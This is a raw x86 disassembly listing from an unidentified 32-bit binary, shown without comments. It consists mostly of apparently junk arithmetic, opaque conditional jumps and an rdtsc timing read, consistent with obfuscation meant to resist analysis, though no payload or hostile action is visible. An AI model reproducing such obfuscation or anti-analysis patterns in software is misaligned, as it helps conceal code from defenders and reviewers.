  4533a1:	sub    DWORD PTR [ebp-0x20],edx
  4533a4:	mov    ecx,0x5
  4533a9:	add    DWORD PTR [ebp-0x20],ebx
  4533ac:	add    ecx,esi
  4533ae:	add    eax,ecx
  4533b0:	add    DWORD PTR [ebp-0x20],eax
  4533b3:	call   0x453ac4
  4533b8:	and    edi,esi
  4533ba:	sub    edi,esi
  4533bc:	sub    edi,eax
  4533be:	sub    edi,eax
  4533c0:	cmp    ebx,DWORD PTR [ebp-0x38]
  4533c3:	jne    0x4533d4
  4533c5:	mov    ecx,DWORD PTR [ebp-0x20]
  4533c8:	add    DWORD PTR [ebp-0x8],edi
  4533cb:	add    ecx,esi
  4533cd:	xor    edx,edx
  4533cf:	add    edx,ecx
  4533d1:	add    DWORD PTR [ebp-0x20],edx
  4533d4:	mov    DWORD PTR [ebp-0x4],eax
  4533d7:	add    DWORD PTR [ebp-0x20],esi
  4533da:	mov    edi,DWORD PTR [ebp-0x14]
  4533dd:	and    ecx,edx
  4533df:	or     DWORD PTR [ebp-0x8],ecx
  4533e2:	sub    edi,DWORD PTR [ebp-0x18]
  4533e5:	mov    ebx,DWORD PTR ds:0x471cbc
  4533eb:	mov    edx,0x6026
  4533f0:	and    edx,esi
  4533f2:	add    DWORD PTR [ebp-0x20],edi
  4533f5:	add    DWORD PTR [ebp-0x20],edx
  4533f8:	add    ebx,ecx
  4533fa:	test   ebx,0x22f6
  453400:	jne    0x45341d
  453402:	xor    ecx,ecx
  453404:	sub    ebx,edi
  453406:	mov    edx,DWORD PTR [ebp-0x8]
  453409:	mov    DWORD PTR [ebp-0x8],ebx
  45340c:	or     ecx,edi
  45340e:	cmp    ecx,DWORD PTR [ebp-0x8]
  453411:	je     0x45341d
  453413:	sub    DWORD PTR [ebp-0x8],ecx
  453416:	xor    eax,eax
  453418:	add    edx,eax
  45341a:	xor    DWORD PTR [ebp-0x20],edx
  45341d:	xor    edi,0x6c417879
  453423:	xor    edx,edx
  453425:	mov    eax,DWORD PTR [ebp-0x8]
  453428:	cmp    edi,esi
  45342a:	jne    0x45343a
  45342c:	add    DWORD PTR [ebp-0x20],edx
  45342f:	cmp    eax,DWORD PTR ds:0x471d58
  453435:	je     0x45343a
  453437:	add    DWORD PTR [ebp-0x20],eax
  45343a:	mov    ecx,DWORD PTR [ebp-0x4]
  45343d:	test   ecx,0x25648430
  453443:	je     0x453448
  453445:	sub    DWORD PTR [ebp-0x8],ecx
  453448:	sub    ecx,DWORD PTR [ebp-0x14]
  45344b:	cmp    ecx,DWORD PTR [ebp-0x1c]
  45344e:	jne    0x45347a
  453450:	add    edx,eax
  453452:	or     DWORD PTR [ebp-0x20],ecx
  453455:	mov    esi,0x46
  45345a:	add    edx,ecx
  45345c:	and    DWORD PTR [ebp-0x20],esi
  45345f:	mov    ebx,DWORD PTR [ebp-0x8]
  453462:	add    edx,ebx
  453464:	cmp    edx,ecx
  453466:	je     0x45347a
  453468:	mov    esi,DWORD PTR [ebp-0x20]
  45346b:	add    DWORD PTR [ebp-0x8],esi
  45346e:	mov    ebx,DWORD PTR ds:0x471d50
  453474:	sub    DWORD PTR [ebp-0x8],ebx
  453477:	mov    DWORD PTR [ebp-0x20],edx
  45347a:	xor    ecx,0x6c41787c
  453480:	mov    edx,DWORD PTR [ebp-0x20]
  453483:	mov    ebx,DWORD PTR [ebp-0x8]
  453486:	sub    edx,edi
  453488:	add    DWORD PTR [ebp-0x8],ebx
  45348b:	add    edx,ecx
  45348d:	and    DWORD PTR [ebp-0x20],edx
  453490:	cmp    edi,ecx
  453492:	je     0x45375a
  453498:	add    ecx,ebx
  45349a:	mov    eax,0xcb
  45349f:	cmp    ecx,DWORD PTR ds:0x471d58
  4534a5:	jne    0x4534bc
  4534a7:	cmp    ecx,0x13cd
  4534ad:	jne    0x4534bc
  4534af:	and    eax,ebx
  4534b1:	mov    edx,DWORD PTR [ebp-0x20]
  4534b4:	sub    DWORD PTR [ebp-0x20],edx
  4534b7:	or     ecx,eax
  4534b9:	add    DWORD PTR [ebp-0x8],ecx
  4534bc:	push   0x471d58
  4534c1:	call   DWORD PTR ds:0x462c70
  4534c7:	test   edi,0x5538
  4534cd:	je     0x453596
  4534d3:	mov    edx,DWORD PTR [ebp-0x8]
  4534d6:	and    edx,esi
  4534d8:	add    DWORD PTR [ebp-0x8],esi
  4534db:	mov    ecx,DWORD PTR [ebp-0x20]
  4534de:	sub    DWORD PTR [ebp-0x20],ecx
  4534e1:	or     DWORD PTR [ebp-0x20],ebx
  4534e4:	test   edx,0x5c
  4534ea:	je     0x453596
  4534f0:	add    edx,edi
  4534f2:	mov    ebx,0xef
  4534f7:	cmp    edx,0xffffff86
  4534fa:	jne    0x453596
  453500:	mov    esi,ebx
  453502:	mov    ecx,0xca64
  453507:	and    esi,eax
  453509:	mov    DWORD PTR [ebp-0x8],edx
  45350c:	cmp    eax,ebx
  45350e:	je     0x453596
  453514:	add    DWORD PTR [ebp-0x20],esi
  453517:	mov    esi,DWORD PTR [ebp-0x8]
  45351a:	mov    ebx,0xa40
  45351f:	cmp    edi,0xcd95
  453525:	je     0x453596
  453527:	mov    edx,DWORD PTR [ebp-0x8]
  45352a:	mov    edi,DWORD PTR [ebp-0x8]
  45352d:	add    edx,esi
  45352f:	add    edx,ecx
  453531:	add    DWORD PTR [ebp-0x8],edi
  453534:	add    DWORD PTR [ebp-0x20],edi
  453537:	mov    DWORD PTR [ebp-0x20],ecx
  45353a:	cmp    edx,0x52
  45353d:	je     0x453596
  45353f:	mov    esi,DWORD PTR [ebp-0x20]
  453542:	mov    edi,0xa5
  453547:	add    DWORD PTR [ebp-0x8],ebx
  45354a:	cmp    esi,DWORD PTR ds:0x471d14
  453550:	jne    0x453596
  453552:	add    DWORD PTR [ebp-0x8],edx
  453555:	mov    edx,DWORD PTR [ebp-0x8]
  453558:	xor    ecx,ecx
  45355a:	add    edx,edx
  45355c:	add    DWORD PTR [ebp-0x20],ebx
  45355f:	sub    DWORD PTR [ebp-0x20],ecx
  453562:	mov    DWORD PTR [ebp-0x20],edi
  453565:	cmp    esi,DWORD PTR [ebp-0x10]
  453568:	jne    0x453596
  45356a:	mov    ecx,0x626c
  45356f:	cmp    edx,DWORD PTR ds:0x471d58
  453575:	jne    0x453596
  453577:	sub    DWORD PTR [ebp-0x20],edx
  45357a:	sub    DWORD PTR [ebp-0x20],esi
  45357d:	mov    edi,0x6c35
  453582:	xor    edx,edx
  453584:	add    ecx,ebx
  453586:	add    edx,ebx
  453588:	and    edx,ebx
  45358a:	add    ecx,ecx
  45358c:	add    edx,edi
  45358e:	sub    edx,esi
  453590:	add    DWORD PTR [ebp-0x20],edx
  453593:	or     DWORD PTR [ebp-0x8],ecx
  453596:	or     eax,eax
  453598:	je     0x45375a
  45359e:	sub    edx,ebx
  4535a0:	mov    edi,DWORD PTR ds:0x471d58
  4535a6:	cmp    edx,DWORD PTR [ebp-0x1c]
  4535a9:	jne    0x4535d8
  4535ab:	mov    ebx,DWORD PTR [ebp-0x20]
  4535ae:	sub    edx,ecx
  4535b0:	mov    ecx,ebx
  4535b2:	cmp    ecx,DWORD PTR ds:0x471d58
  4535b8:	je     0x4535d8
  4535ba:	mov    ebx,DWORD PTR [ebp-0x8]
  4535bd:	mov    DWORD PTR [ebp-0x8],ecx
  4535c0:	sub    DWORD PTR [ebp-0x20],ebx
  4535c3:	mov    ebx,0x6353
  4535c8:	sub    DWORD PTR [ebp-0x20],edi
  4535cb:	and    edx,ebx
  4535cd:	test   edx,0x52
  4535d3:	je     0x4535d8
  4535d5:	sub    DWORD PTR [ebp-0x8],edx
  4535d8:	add    DWORD PTR [ebp-0x24],0x32a5ceeb
  4535df:	cmp    ecx,0x67488410
  4535e5:	je     0x453613
  4535e7:	mov    esi,DWORD PTR ds:0x471d58
  4535ed:	mov    ebx,DWORD PTR [ebp-0x8]
  4535f0:	sub    ebx,ecx
  4535f2:	cmp    ebx,0x1
  4535f5:	je     0x453613
  4535f7:	xor    DWORD PTR [ebp-0x20],esi
  4535fa:	add    ebx,ecx
  4535fc:	mov    edx,DWORD PTR ds:0x471d94
  453602:	mov    ecx,DWORD PTR [ebp-0x20]
  453605:	add    ecx,eax
  453607:	add    DWORD PTR [ebp-0x20],ecx
  45360a:	sub    DWORD PTR [ebp-0x20],ebx
  45360d:	sub    DWORD PTR [ebp-0x8],ecx
  453610:	add    DWORD PTR [ebp-0x8],edx
  453613:	lea    esi,[eax+0xa91]
  453619:	and    ebx,edi
  45361b:	mov    edx,DWORD PTR [ebp-0x20]
  45361e:	sub    edx,esi
  453620:	mov    edi,esi
  453622:	cmp    edx,DWORD PTR ds:0x471d14
  453628:	jne    0x4536a4
  45362a:	cmp    edi,DWORD PTR [ebp-0x20]
  45362d:	jne    0x4536a4
  45362f:	add    edi,ecx
  453631:	sub    DWORD PTR [ebp-0x20],ebx
  453634:	test   edi,0xbe
  45363a:	je     0x4536a4
  45363c:	mov    eax,DWORD PTR [ebp-0x20]
  45363f:	cmp    edx,eax
  453641:	jne    0x4536a4
  453643:	cmp    eax,0xffffffec
  453646:	je     0x4536a4
  453648:	mov    ebx,DWORD PTR [ebp-0x8]
  45364b:	cmp    edx,DWORD PTR ds:0x471cbc
  453651:	jne    0x4536a4
  453653:	add    DWORD PTR [ebp-0x20],eax
  453656:	xor    eax,eax
  453658:	xor    ecx,ecx
  45365a:	sub    DWORD PTR [ebp-0x20],edx
  45365d:	and    eax,edi
  45365f:	xor    DWORD PTR [ebp-0x8],ecx
  453662:	test   eax,0xdad2
  453667:	jne    0x4536a4
  453669:	cmp    eax,0x76
  45366c:	jne    0x4536a4
  45366e:	sub    DWORD PTR [ebp-0x8],eax
  453671:	sub    ebx,esi
  453673:	add    DWORD PTR [ebp-0x20],edi
  453676:	mov    eax,DWORD PTR [ebp-0x20]
  453679:	mov    edx,edi
  45367b:	cmp    edx,DWORD PTR [ebp-0x30]
  45367e:	je     0x4536a4
  453680:	mov    ecx,DWORD PTR [ebp-0x8]
  453683:	mov    edi,DWORD PTR [ebp-0x20]
  453686:	sub    ebx,edx
  453688:	cmp    ebx,DWORD PTR ds:0x471d50
  45368e:	je     0x4536a4
  453690:	mov    edx,DWORD PTR [ebp-0x20]
  453693:	add    eax,ebx
  453695:	sub    DWORD PTR [ebp-0x20],eax
  453698:	and    ecx,edx
  45369a:	sub    DWORD PTR [ebp-0x20],ecx
  45369d:	and    edi,ebx
  45369f:	add    edi,edx
  4536a1:	sub    DWORD PTR [ebp-0x20],edi
  4536a4:	inc    esi
  4536a5:	cmp    esi,0x74
  4536a8:	jne    0x4536ad
  4536aa:	add    DWORD PTR [ebp-0x20],esi
  4536ad:	mov    ebx,DWORD PTR [esi]
  4536af:	sub    eax,edi
  4536b1:	mov    edx,0xff
  4536b6:	cmp    eax,0x57
  4536b9:	jne    0x4536c4
  4536bb:	add    DWORD PTR [ebp-0x8],eax
  4536be:	add    DWORD PTR [ebp-0x20],edi
  4536c1:	mov    DWORD PTR [ebp-0x34],edx
  4536c4:	sub    ebx,0xf47d8c0b
  4536ca:	mov    edx,DWORD PTR ds:0x471d00
  4536d0:	cmp    ebx,0xffffffb8
  4536d3:	jne    0x45370e
  4536d5:	cmp    ebx,eax
  4536d7:	je     0x45370e
  4536d9:	mov    edx,DWORD PTR ds:0x471d94
  4536df:	cmp    ecx,0xfffffff7
  4536e2:	jne    0x45370e
  4536e4:	add    DWORD PTR [ebp-0x8],eax
  4536e7:	and    edx,edi
  4536e9:	add    DWORD PTR [ebp-0x20],ebx
  4536ec:	cmp    edi,DWORD PTR ds:0x471d00
  4536f2:	je     0x45370e
  4536f4:	cmp    edx,DWORD PTR [ebp-0x20]
  4536f7:	je     0x45370e
  4536f9:	test   edx,0x11
  4536ff:	jne    0x45370e
  453701:	or     edx,ecx
  453703:	cmp    edx,DWORD PTR ds:0x471d00
  453709:	je     0x45370e
  45370b:	add    DWORD PTR [ebp-0x20],edx
  45370e:	cmp    ebx,0x68c33428
  453714:	jne    0x453619
  45371a:	add    DWORD PTR [ebp-0x20],edx
  45371d:	mov    ebx,DWORD PTR [esi+0x4]
  453720:	mov    ecx,DWORD PTR ds:0x471cd8
  453726:	mov    edi,DWORD PTR [ebp-0x8]
  453729:	sub    DWORD PTR [ebp-0x20],ebx
  45372c:	cmp    edi,DWORD PTR [ebp-0x40]
  45372f:	jne    0x453757
  453731:	add    DWORD PTR [ebp-0x20],edi
  453734:	mov    eax,0xcc73
  453739:	add    eax,ebx
  45373b:	mov    esi,0x20
  453740:	add    DWORD PTR [ebp-0x8],esi
  453743:	add    eax,esi
  453745:	add    ecx,edi
  453747:	add    eax,ecx
  453749:	cmp    edx,DWORD PTR [ebp-0x3c]
  45374c:	je     0x453757
  45374e:	sub    DWORD PTR [ebp-0x20],edi
  453751:	sub    DWORD PTR [ebp-0x8],ebx
  453754:	and    DWORD PTR [ebp-0x8],eax
  453757:	sub    DWORD PTR [ebp-0x24],ebx
  45375a:	cmp    eax,0x7970
  45375f:	je     0x453764
  453761:	add    DWORD PTR [ebp-0x8],eax
  453764:	mov    ecx,0xb6
  453769:	mov    edx,0x23
  45376e:	cmp    ebx,DWORD PTR ds:0x471d14
  453774:	jne    0x453792
  453776:	mov    ebx,0xb0
  45377b:	cmp    edi,0xffffffa1
  45377e:	je     0x453792
  453780:	mov    ebx,DWORD PTR ds:0x471d50
  453786:	mov    edx,ebx
  453788:	sub    edx,ebx
  45378a:	sub    DWORD PTR [ebp-0x20],edx
  45378d:	add    ecx,edx
  45378f:	sub    DWORD PTR [ebp-0x8],ecx
  453792:	mov    edi,DWORD PTR [ebp+0xc]
  453795:	mov    edx,esi
  453797:	mov    eax,DWORD PTR ds:0x471d74
  45379d:	add    DWORD PTR [ebp-0x8],eax
  4537a0:	add    edx,esi
  4537a2:	mov    DWORD PTR [ebp-0x20],edx
  4537a5:	mov    esi,DWORD PTR [ebp-0x24]
  4537a8:	mov    edx,DWORD PTR ds:0x471d14
  4537ae:	mov    ebx,DWORD PTR [ebp-0x20]
  4537b1:	sub    DWORD PTR [ebp-0x20],esi
  4537b4:	cmp    ebx,DWORD PTR ds:0x471d58
  4537ba:	jne    0x4537e3
  4537bc:	sub    edx,esi
  4537be:	cmp    edx,edi
  4537c0:	je     0x4537e3
  4537c2:	mov    eax,DWORD PTR [ebp-0x8]
  4537c5:	cmp    eax,0x1
  4537c8:	jne    0x4537e3
  4537ca:	and    edx,eax
  4537cc:	and    edx,esi
  4537ce:	add    edx,edi
  4537d0:	mov    eax,DWORD PTR [ebp-0x20]
  4537d3:	mov    ecx,0xe1
  4537d8:	sub    edx,ebx
  4537da:	sub    DWORD PTR [ebp-0x20],eax
  4537dd:	sub    DWORD PTR [ebp-0x20],ecx
  4537e0:	or     DWORD PTR [ebp-0x20],edx
  4537e3:	mov    DWORD PTR [edi+0x0],esi
  4537e6:	sub    eax,edx
  4537e8:	cmp    eax,ebx
  4537ea:	jne    0x4537f1
  4537ec:	add    eax,esi
  4537ee:	add    DWORD PTR [ebp-0x8],eax
  4537f1:	add    eax,edx
  4537f3:	mov    edx,0x5b
  4537f8:	and    edx,ecx
  4537fa:	mov    ebx,edi
  4537fc:	sub    DWORD PTR [ebp-0x20],eax
  4537ff:	and    edx,esi
  453801:	add    ebx,esi
  453803:	cmp    ebx,0x21120228
  453809:	jne    0x453886
  45380b:	mov    ecx,DWORD PTR ds:0x471d58
  453811:	xor    DWORD PTR [ebp-0x20],ecx
  453814:	mov    ecx,DWORD PTR [ebp-0x20]
  453817:	sub    edx,ecx
  453819:	add    DWORD PTR [ebp-0x20],edx
  45381c:	sub    ebx,esi
  45381e:	and    ebx,ecx
  453820:	and    DWORD PTR [ebp-0x8],eax
  453823:	sub    ebx,eax
  453825:	cmp    ebx,eax
  453827:	je     0x453886
  453829:	sub    ebx,ecx
  45382b:	cmp    ebx,esi
  45382d:	jne    0x453886
  45382f:	xor    eax,eax
  453831:	mov    edx,0x42
  453836:	add    DWORD PTR [ebp-0x20],ecx
  453839:	sub    eax,ecx
  45383b:	or     DWORD PTR [ebp-0x20],esi
  45383e:	cmp    ebx,0x59
  453841:	jne    0x453886
  453843:	mov    esi,0xd8
  453848:	add    DWORD PTR [ebp-0x20],ebx
  45384b:	and    edx,ebx
  45384d:	cmp    eax,DWORD PTR [ebp-0x44]
  453850:	jne    0x453886
  453852:	sub    edx,ecx
  453854:	mov    ebx,0xe2
  453859:	sub    DWORD PTR [ebp-0x8],esi
  45385c:	cmp    edx,DWORD PTR [ebp-0x2c]
  45385f:	jne    0x453886
  453861:	add    edx,eax
  453863:	mov    ecx,eax
  453865:	and    ecx,esi
  453867:	mov    eax,0x17
  45386c:	add    DWORD PTR [ebp-0x20],ecx
  45386f:	sub    edx,ecx
  453871:	add    DWORD PTR [ebp-0x8],ecx
  453874:	add    DWORD PTR [ebp-0x8],eax
  453877:	mov    DWORD PTR [ebp-0x28],ebx
  45387a:	cmp    edx,0xffffffb5
  45387d:	jne    0x453886
  45387f:	add    edx,eax
  453881:	sub    edx,ebx
  453883:	sub    DWORD PTR [ebp-0x20],edx
  453886:	pop    edi
  453887:	mov    eax,DWORD PTR [ebp-0x8]
  45388a:	add    DWORD PTR [ebp-0x8],edi
  45388d:	mov    ecx,DWORD PTR [ebp-0x8]
  453890:	sub    DWORD PTR [ebp-0x8],ecx
  453893:	cmp    eax,0x59ea
  453898:	je     0x45399f
  45389e:	add    eax,edx
  4538a0:	mov    edx,DWORD PTR [ebp-0x8]
  4538a3:	xor    ecx,ecx
  4538a5:	sub    ecx,ebx
  4538a7:	add    edx,edi
  4538a9:	sub    edx,ebx
  4538ab:	sub    DWORD PTR [ebp-0x8],eax
  4538ae:	cmp    edx,DWORD PTR ds:0x471d14
  4538b4:	je     0x45399f
  4538ba:	cmp    eax,esi
  4538bc:	je     0x45399f
  4538c2:	add    DWORD PTR [ebp-0x20],edx
  4538c5:	mov    ebx,DWORD PTR [ebp-0x8]
  4538c8:	add    ecx,edi
  4538ca:	cmp    ecx,0xdca1
  4538d0:	jne    0x45399f
  4538d6:	sub    DWORD PTR [ebp-0x8],ecx
  4538d9:	add    DWORD PTR [ebp-0x20],edi
  4538dc:	mov    edx,0xbbd0
  4538e1:	add    DWORD PTR [ebp-0x8],ebx
  4538e4:	add    edx,esi
  4538e6:	sub    edx,eax
  4538e8:	mov    eax,DWORD PTR [ebp-0x20]
  4538eb:	add    eax,esi
  4538ed:	sub    edx,ecx
  4538ef:	cmp    ebx,0x8b94
  4538f5:	jne    0x45399f
  4538fb:	sub    DWORD PTR [ebp-0x8],edi
  4538fe:	cmp    edx,0x57
  453901:	je     0x45399f
  453907:	mov    ecx,DWORD PTR [ebp-0x20]
  45390a:	or     DWORD PTR [ebp-0x20],ecx
  45390d:	cmp    eax,edi
  45390f:	je     0x45399f
  453915:	mov    esi,DWORD PTR [ebp-0x20]
  453918:	add    DWORD PTR [ebp-0x20],ecx
  45391b:	cmp    edx,0xffffffab
  45391e:	je     0x45399f
  453920:	cmp    esi,DWORD PTR ds:0x471d58
  453926:	je     0x45399f
  453928:	mov    ecx,DWORD PTR ds:0x471d14
  45392e:	mov    ebx,0xcc
  453933:	sub    esi,edx
  453935:	cmp    esi,edx
  453937:	je     0x45399f
  453939:	add    DWORD PTR [ebp-0x8],ecx
  45393c:	add    DWORD PTR [ebp-0x20],eax
  45393f:	mov    ebx,DWORD PTR ds:0x471cfc
  453945:	add    DWORD PTR [ebp-0x20],esi
  453948:	mov    eax,0x5a
  45394d:	and    eax,esi
  45394f:	and    ebx,edx
  453951:	cmp    eax,DWORD PTR ds:0x471cd8
  453957:	jne    0x45399f
  453959:	mov    esi,DWORD PTR ds:0x471d74
  45395f:	sub    esi,edx
  453961:	add    ebx,edi
  453963:	cmp    esi,0xffffffa7
  453966:	jne    0x45399f
  453968:	xor    DWORD PTR [ebp-0x8],esi
  45396b:	cmp    ebx,0xffffffdc
  45396e:	jne    0x45399f
  453970:	mov    edx,DWORD PTR ds:0x471ce0
  453976:	mov    esi,edx
  453978:	mov    DWORD PTR [ebp-0x8],esi
  45397b:	cmp    eax,DWORD PTR ds:0x471cfc
  453981:	je     0x45399f
  453983:	mov    edx,DWORD PTR [ebp-0x8]
  453986:	mov    esi,DWORD PTR [ebp-0x8]
  453989:	add    DWORD PTR [ebp-0x8],edx
  45398c:	test   esi,0x66
  453992:	jne    0x45399f
  453994:	and    DWORD PTR [ebp-0x8],eax
  453997:	sub    DWORD PTR [ebp-0x20],esi
  45399a:	add    ebx,eax
  45399c:	sub    DWORD PTR [ebp-0x20],ebx
  45399f:	pop    esi
  4539a0:	mov    ebx,DWORD PTR [ebp-0x20]
  4539a3:	mov    edx,DWORD PTR [ebp-0x20]
  4539a6:	cmp    esi,0xffffff9e
  4539a9:	jne    0x453a95
  4539af:	sub    ebx,eax
  4539b1:	cmp    edx,DWORD PTR ds:0x471ce0
  4539b7:	je     0x453a95
  4539bd:	add    DWORD PTR [ebp-0x20],ebx
  4539c0:	xor    eax,eax
  4539c2:	and    DWORD PTR [ebp-0x8],esi
  4539c5:	mov    ecx,DWORD PTR ds:0x471d94
  4539cb:	cmp    edx,0xffffffe0
  4539ce:	jne    0x453a95
  4539d4:	mov    ebx,DWORD PTR [ebp-0x8]
  4539d7:	sub    edx,eax
  4539d9:	mov    eax,DWORD PTR [ebp-0x8]
  4539dc:	add    ebx,edi
  4539de:	and    ecx,esi
  4539e0:	or     ebx,ecx
  4539e2:	add    eax,ebx
  4539e4:	cmp    edx,ebx
  4539e6:	jne    0x453a95
  4539ec:	mov    ecx,DWORD PTR [ebp-0x20]
  4539ef:	mov    ebx,0xe4
  4539f4:	or     edx,ecx
  4539f6:	add    edx,edx
  4539f8:	sub    ebx,esi
  4539fa:	sub    edx,esi
  4539fc:	add    DWORD PTR [ebp-0x8],eax
  4539ff:	add    DWORD PTR [ebp-0x8],ebx
  453a02:	cmp    edx,0xffffffaf
  453a05:	jne    0x453a95
  453a0b:	mov    ecx,DWORD PTR ds:0x471d14
  453a11:	sub    edx,edi
  453a13:	and    edx,ebx
  453a15:	mov    ebx,DWORD PTR [ebp-0x8]
  453a18:	cmp    ebx,edx
  453a1a:	je     0x453a95
  453a1c:	add    DWORD PTR [ebp-0x8],ebx
  453a1f:	add    DWORD PTR [ebp-0x20],ecx
  453a22:	add    edx,ebx
  453a24:	mov    ecx,DWORD PTR [ebp-0x20]
  453a27:	add    ecx,edx
  453a29:	mov    eax,DWORD PTR ds:0x471d58
  453a2f:	add    DWORD PTR [ebp-0x20],ecx
  453a32:	sub    eax,esi
  453a34:	cmp    eax,0x69
  453a37:	je     0x453a95
  453a39:	and    DWORD PTR [ebp-0x20],esi
  453a3c:	mov    ebx,DWORD PTR [ebp-0x8]
  453a3f:	cmp    eax,DWORD PTR ds:0x471d58
  453a45:	jne    0x453a95
  453a47:	mov    ecx,0x4d80
  453a4c:	mov    edx,0xad
  453a51:	add    edx,edx
  453a53:	add    DWORD PTR [ebp-0x20],ecx
  453a56:	test   ebx,0x27
  453a5c:	je     0x453a95
  453a5e:	mov    ecx,0xeaf6
  453a63:	or     edx,edi
  453a65:	add    DWORD PTR [ebp-0x20],edx
  453a68:	cmp    eax,DWORD PTR [ebp-0xc]
  453a6b:	jne    0x453a95
  453a6d:	cmp    eax,DWORD PTR ds:0x471cbc
  453a73:	je     0x453a95
  453a75:	cmp    eax,0x3bc2
  453a7a:	je     0x453a95
  453a7c:	or     DWORD PTR [ebp-0x20],ebx
  453a7f:	add    DWORD PTR [ebp-0x8],ecx
  453a82:	sub    eax,ecx
  453a84:	mov    edx,DWORD PTR [ebp-0x20]
  453a87:	mov    ecx,0xf2
  453a8c:	sub    DWORD PTR [ebp-0x20],ecx
  453a8f:	add    DWORD PTR [ebp-0x8],eax
  453a92:	sub    DWORD PTR [ebp-0x8],edx
  453a95:	pop    ebx
  453a96:	mov    eax,DWORD PTR [ebp-0x8]
  453a99:	add    eax,esi
  453a9b:	cmp    ebx,0x47
  453a9e:	jne    0x453abb
  453aa0:	add    eax,eax
  453aa2:	cmp    ebx,0xffffff94
  453aa5:	jne    0x453abb
  453aa7:	cmp    eax,DWORD PTR [ebp-0x38]
  453aaa:	je     0x453abb
  453aac:	mov    edx,0x8
  453ab1:	or     eax,edx
  453ab3:	xor    DWORD PTR [ebp-0x20],ebx
  453ab6:	mov    edx,eax
  453ab8:	mov    DWORD PTR [ebp-0x20],edx
  453abb:	leave  
  453abc:	ret    0x8
  453abf:	int3   
  453ac0:	int3   
  453ac1:	int3   
  453ac2:	int3   
  453ac3:	int3   
  453ac4:	push   ebp
  453ac5:	mov    ebp,esp
  453ac7:	sub    esp,0x18
  453aca:	mov    ecx,0x1a
  453acf:	mov    eax,0x4024425a
  453ad4:	add    ecx,eax
  453ad6:	mov    DWORD PTR [ebp-0x18],eax
  453ad9:	sub    ecx,eax
  453adb:	sub    ecx,eax
  453add:	add    ecx,ecx
  453adf:	add    DWORD PTR [ebp-0x18],ecx
  453ae2:	push   ebx
  453ae3:	mov    edx,DWORD PTR [ebp-0x18]
  453ae6:	or     edx,ecx
  453ae8:	mov    ecx,DWORD PTR ds:0x471cf4
  453aee:	cmp    edx,0x7f
  453af1:	je     0x453b33
  453af3:	mov    ecx,0x44
  453af8:	mov    DWORD PTR [ebp-0x18],edx
  453afb:	mov    ebx,0xd4
  453b00:	cmp    edx,0xffffff91
  453b03:	je     0x453b33
  453b05:	mov    eax,edx
  453b07:	cmp    eax,0xffffff91
  453b0a:	je     0x453b33
  453b0c:	or     ebx,ecx
  453b0e:	mov    ecx,DWORD PTR [ebp-0x18]
  453b11:	and    ecx,eax
  453b13:	add    ecx,ebx
  453b15:	mov    edx,DWORD PTR [ebp-0x18]
  453b18:	add    ecx,ebx
  453b1a:	cmp    ecx,DWORD PTR [ebp-0x18]
  453b1d:	jne    0x453b33
  453b1f:	or     DWORD PTR [ebp-0x18],edx
  453b22:	mov    ebx,DWORD PTR [ebp-0x18]
  453b25:	mov    eax,DWORD PTR ds:0x471cf4
  453b2b:	add    ebx,ecx
  453b2d:	add    DWORD PTR [ebp-0x18],eax
  453b30:	add    DWORD PTR [ebp-0x18],ebx
  453b33:	push   esi
  453b34:	add    DWORD PTR [ebp-0x18],eax
  453b37:	push   edi
  453b38:	mov    ecx,0x0
  453b3d:	mov    ebx,DWORD PTR [ebp-0x18]
  453b40:	cmp    edx,DWORD PTR [ebp-0x10]
  453b43:	je     0x453b62
  453b45:	cmp    ebx,DWORD PTR ds:0x471cf4
  453b4b:	je     0x453b62
  453b4d:	mov    eax,0x5ce1
  453b52:	or     DWORD PTR [ebp-0x18],eax
  453b55:	mov    edx,0x6c
  453b5a:	sub    DWORD PTR [ebp-0x18],edx
  453b5d:	sub    ebx,ecx
  453b5f:	add    DWORD PTR [ebp-0x18],ebx
  453b62:	mov    esi,ecx
  453b64:	or     DWORD PTR [ebp-0x18],edx
  453b67:	mov    esi,DWORD PTR [ebp-0x18]
  453b6a:	add    esi,ebx
  453b6c:	cmp    esi,DWORD PTR ds:0x471cf4
  453b72:	jne    0x453b77
  453b74:	sub    DWORD PTR [ebp-0x18],esi
  453b77:	cmp    esi,0xffffffad
  453b7a:	je     0x453b84
  453b7c:	cmp    ebx,DWORD PTR [ebp-0x18]
  453b7f:	je     0x453b84
  453b81:	or     DWORD PTR [ebp-0x18],edx
  453b84:	rdtsc  
  453b86:	mov    esi,0xc6a4
  453b8b:	add    DWORD PTR [ebp-0x18],eax
  453b8e:	mov    edi,DWORD PTR [ebp-0x18]
  453b91:	sub    esi,ebx
  453b93:	sub    esi,eax
  453b95:	and    DWORD PTR [ebp-0x18],esi
  453b98:	cmp    edi,ebx
  453b9a:	jne    0x453c00
  453b9c:	add    edx,edx
  453b9e:	cmp    edi,0x4cbc86f0
  453ba4:	jne    0x453c00
  453ba6:	cmp    edi,0x26
  453ba9:	je     0x453c00
  453bab:	and    edi,eax
  453bad:	add    edi,ecx
  453baf:	sub    DWORD PTR [ebp-0x18],eax
  453bb2:	mov    ecx,DWORD PTR [ebp-0x18]
  453bb5:	cmp    ecx,DWORD PTR ds:0x471cf4
  453bbb:	je     0x453c00
  453bbd:	mov    esi,0x92
  453bc2:	cmp    ecx,DWORD PTR ds:0x471cf4
  453bc8:	je     0x453bf7
  453bca:	cmp    edi,ecx
  453bcc:	jne    0x453bf7
  453bce:	and    DWORD PTR [ebp-0x18],eax
  453bd1:	and    ecx,eax
  453bd3:	cmp    ecx,DWORD PTR [ebp-0x8]
  453bd6:	je     0x453bf7
  453bd8:	and    edi,edx
  453bda:	add    DWORD PTR [ebp-0x18],ecx
  453bdd:	cmp    edi,eax
  453bdf:	jne    0x453bf7
  453be1:	mov    ebx,DWORD PTR [ebp-0x18]
  453be4:	mov    ecx,DWORD PTR [ebp-0x18]
  453be7:	cmp    ebx,DWORD PTR [ebp-0x4]
  453bea:	jne    0x453bf7
  453bec:	add    DWORD PTR [ebp-0x18],edi
  453bef:	mov    edi,ebx
  453bf1:	sub    DWORD PTR [ebp-0x18],ecx
  453bf4:	sub    DWORD PTR [ebp-0x18],edi
  453bf7:	mov    ecx,DWORD PTR [ebp-0x18]
  453bfa:	add    DWORD PTR [ebp-0x18],ecx
  453bfd:	sub    DWORD PTR [ebp-0x18],esi
  453c00:	xor    esi,esi
  453c02:	mov    edi,DWORD PTR [ebp-0x18]
  453c05:	cmp    edi,DWORD PTR ds:0x471cf4
  453c0b:	jne    0x453cd1
  453c11:	xor    ecx,ecx
  453c13:	mov    edx,DWORD PTR [ebp-0x18]
  453c16:	add    DWORD PTR [ebp-0x18],esi
  453c19:	cmp    edx,0x50
  453c1c:	jne    0x453cd1
  453c22:	mov    esi,ecx
